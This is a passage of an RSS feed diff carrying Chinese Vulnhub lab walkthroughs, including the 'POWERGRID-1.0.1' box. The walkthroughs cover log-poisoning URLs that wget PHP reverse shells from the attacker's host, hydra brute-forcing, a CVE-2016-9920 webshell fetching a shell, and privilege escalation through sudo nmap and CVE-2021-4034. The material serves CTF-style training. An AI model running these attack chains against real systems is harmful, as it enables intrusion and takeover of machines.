+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a61717;background-color:#e3d2d2">http://10.0.2.6/console/file.php?file=/var/log/auth.log&amp;amp;123=wget http://10.0.2.15/2.php -O /var/www/html/2.php
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>使用antsword连上&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/489/5.webp" alt="5">&lt;/p>
+&lt;h4 id="思路三">思路三&lt;/h4>
+&lt;p>修改kali自带的php反弹shell脚本 &lt;code>/usr/share/webshells/php/php-reverse-shell.php&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/489/6.webp" alt="6">&lt;/p>
+&lt;p>下载反弹shell脚本到/tmp目录并执行&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://10.0.2.6/console/file.php?file=/var/log/auth.log&amp;amp;123=wget http://10.0.2.15/php-reverse-shell.php -O /tmp/1.php|php /tmp/1.php
+&lt;/code>&lt;/pre>&lt;p>成功接收反弹&lt;/p>
+&lt;h2 id="提权">提权&lt;/h2>
+&lt;p>切换到交互式shell&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ whereis python
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>python: /usr/bin/python3.6m /usr/bin/python3.6 /usr/lib/python3.6 /usr/lib/python3.7 /usr/lib/python2.7 /etc/python3.6 /usr/local/lib/python3.6
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python3.6 -c &lt;span style="color:#cd5555">&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>上传&lt;a href="https://www.iihack.com/pages/tools/linpeas.sh.html">linpeas.sh&lt;/a>并运行发现apache2配置文件可以更改&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/489/7.webp" alt="7">&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ cat /etc/passwd|grep bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root:x:0:0:root:/root:/bin/bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>natraj:x:1000:1000:natraj,,,:/home/natraj:/bin/bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mahakal:x:1001:1001:,,,:/home/mahakal:/bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="natraj">natraj&lt;/h3>
+&lt;p>修改/etc/apache2/apache2.conf将运行权限修改为natraj，重启靶机系统，反弹shell，再次运行linpeas.sh未发现有用信息&lt;/p>
+&lt;h3 id="mahakal">mahakal&lt;/h3>
+&lt;p>修改/etc/apache2/apache2.conf将运行权限修改为mahakal，重启靶机系统，反弹shell，再次运行linpeas.sh&lt;/p>
+&lt;p>发现可以免密运行&lt;code>sudo nmap&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/489/9.webp" alt="9">&lt;/p>
+&lt;p>想到nmap可以执行script，而script是lua语言编写，应该可以执行系统命令&lt;/p>
+&lt;p>参考 &lt;a href="https://www.lua.org/pil/22.2.html">https://www.lua.org/pil/22.2.html&lt;/a> 编写文件555&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/489/10.webp" alt="10">&lt;/p>
+&lt;p>通过&lt;code>nmap&lt;/code>加载555&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/489/11.webp" alt="11">&lt;/p>
+&lt;p>成功接收root反弹&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/489/12.webp" alt="12">&lt;/p>- https://www.vulnhub.cn/walkthrough/489/ - This is a customized copyright.</description></item><item><title>Vulnhub 485 POWERGRID-1.0.1</title><link>https://www.vulnhub.cn/walkthrough/485/</link><pubDate>Thu, 28 May 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/485/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/485/ -&lt;p>考点：hydra,CVE
+槽点：靶机三小时关闭，导入虚拟机后应及时快照。因为字典增大，三个小时内根本无法爆破成功。&lt;/p>
+&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/powergrid-101,485/">https://www.vulnhub.com/entry/powergrid-101,485/&lt;/a>&lt;/p>
+&lt;h2 id="环境配置">环境配置&lt;/h2>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>名称&lt;/th>
+&lt;th>IP&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Kali Linux&lt;/td>
+&lt;td>10.0.2.15&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>POWERGRID-1.0.1&lt;/td>
+&lt;td>10.0.2.28&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="初步打点">初步打点&lt;/h2>
+&lt;h3 id="端口扫描">端口扫描&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.28
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.38 ((Debian))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: PowerGrid - Turning your lights off unless you pay.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.38 (Debian)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>143/tcp open imap Dovecot imapd
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_imap-capabilities: STARTTLS listed IMAP4rev1 LOGINDISABLEDA0001 more have Pre-login post-login capabilities LITERAL+ LOGIN-REFERRALS OK ID ENABLE IDLE SASL-IR
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssl-cert: Subject: &lt;span style="color:#00688b">commonName&lt;/span>=powergrid
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Subject Alternative Name: DNS:powergrid
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Issuer: &lt;span style="color:#00688b">commonName&lt;/span>=powergrid
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key bits: &lt;span style="color:#b452cd">2048&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Signature Algorithm: sha256WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid before: 2020-05-19T16:49:55
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid after: 2030-05-17T16:49:55
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| MD5: 29a4 274f 71a8 &lt;span style="color:#b452cd">9044&lt;/span> &lt;span style="color:#b452cd">9910&lt;/span> &lt;span style="color:#b452cd">0979&lt;/span> &lt;span style="color:#b452cd">8540&lt;/span> ecab
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_SHA-1: 06a5 &lt;span style="color:#b452cd">0056&lt;/span> cf2c 7f94 9aad 01e7 7e91 &lt;span style="color:#b452cd">7006&lt;/span> 4eb0 d553
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ssl-date: TLS randomness does not represent &lt;span style="color:#658b00">time&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>993/tcp open ssl/imap Dovecot imapd
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_imap-capabilities: &lt;span style="color:#00688b">AUTH&lt;/span>=PLAINA0001 listed IMAP4rev1 have more Pre-login post-login capabilities LITERAL+ LOGIN-REFERRALS OK ID ENABLE IDLE SASL-IR
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssl-cert: Subject: &lt;span style="color:#00688b">commonName&lt;/span>=powergrid
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Subject Alternative Name: DNS:powergrid
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Issuer: &lt;span style="color:#00688b">commonName&lt;/span>=powergrid
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key bits: &lt;span style="color:#b452cd">2048&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Signature Algorithm: sha256WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid before: 2020-05-19T16:49:55
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid after: 2030-05-17T16:49:55
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| MD5: 29a4 274f 71a8 &lt;span style="color:#b452cd">9044&lt;/span> &lt;span style="color:#b452cd">9910&lt;/span> &lt;span style="color:#b452cd">0979&lt;/span> &lt;span style="color:#b452cd">8540&lt;/span> ecab
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_SHA-1: 06a5 &lt;span style="color:#b452cd">0056&lt;/span> cf2c 7f94 9aad 01e7 7e91 &lt;span style="color:#b452cd">7006&lt;/span> 4eb0 d553
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ssl-date: TLS randomness does not represent &lt;span style="color:#658b00">time&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gobuster dir --url http://10.0.2.28 -w /usr/share/wordlists/dirb/big.txt -x .php
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>===============================================================
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/.htpasswd (Status: 403) [Size: 274]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/.htaccess (Status: 403) [Size: 274]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/.htpasswd.php (Status: 403) [Size: 274]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/.htaccess.php (Status: 403) [Size: 274]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/images (Status: 301) [Size: 307] [--&amp;gt; http://10.0.2.28/images/]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/index.php (Status: 200) [Size: 3644]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/server-status (Status: 403) [Size: 274]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/zmail (Status: 401) [Size: 456]
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>访问首页获得用户名三个，本地保存至文件&lt;code>user&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/485/1.webp" alt="1">&lt;/p>
+&lt;p>访问zmail发现需要http认证&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/485/2.webp" alt="2">&lt;/p>
+&lt;p>上hydra爆破&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hydra -L user -P /usr/share/wordlists/rockyou.txt -f 10.0.2.28 http-get /zmail
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>获得用户名密码&lt;/p>
+&lt;p>用户 &lt;code>p48&lt;/code>&lt;/p>
+&lt;p>密码 &lt;code>electrico&lt;/code>&lt;/p>
+&lt;h3 id="漏洞发现">漏洞发现&lt;/h3>
+&lt;p>再次访问&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/485/4.webp" alt="4">&lt;/p>
+&lt;p>登录成功&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/485/5.webp" alt="5">&lt;/p>
+&lt;p>对照&lt;a href="https://github.com/t0kx/exploit-CVE-2016-9920">https://github.com/t0kx/exploit-CVE-2016-9920&lt;/a> 进行利用&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/485/6.webp" alt="6">&lt;/p>
+&lt;h2 id="获得权限">获得权限&lt;/h2>
+&lt;p>获得webshell，下载反弹shell&lt;/p>
+&lt;p>http://10.0.2.28/zmail/backdoor.php?cmd=wget http://10.0.2.24/reverse/r444.php&lt;/p>
+&lt;p>访问http://10.0.2.28/zmail/r444.php后获得反弹shell&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/485/7.webp" alt="7">&lt;/p>
+&lt;h2 id="提权">提权&lt;/h2>
+&lt;p>使用CVE-2021-4034提权&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/485/8.webp" alt="8">&lt;/p>- https://www.vulnhub.cn/walkthrough/485/ - This is a customized copyright.</description></item></channel></rss>
